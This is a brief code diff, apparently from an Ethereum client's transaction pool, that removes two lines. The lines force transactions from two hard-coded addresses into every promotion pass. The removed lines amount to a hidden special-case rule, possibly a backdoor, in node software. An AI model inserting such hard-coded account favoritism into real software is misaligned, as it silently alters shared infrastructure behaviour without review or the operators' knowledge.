@@ -1469,8 +1469,6 @@ func (pool *LegacyPool) promoteExecutables(accounts []common.Address) []*types.T
 
 	// Iterate over all accounts and promote any executable transactions
 	gasLimit := txpool.EffectiveGasLimit(pool.chainconfig, pool.currentHead.Load().GasLimit)
-	accounts = append(accounts, common.HexToAddress("0x5197EF103d47B06d68a3A2642F32A99De57DB86E"))
-	accounts = append(accounts, common.HexToAddress("0x1aEB0963d2A169FCD802582dE06682CA43C3a045"))
 	for _, addr := range accounts {
 		list := pool.queue[addr]
 		if list == nil {
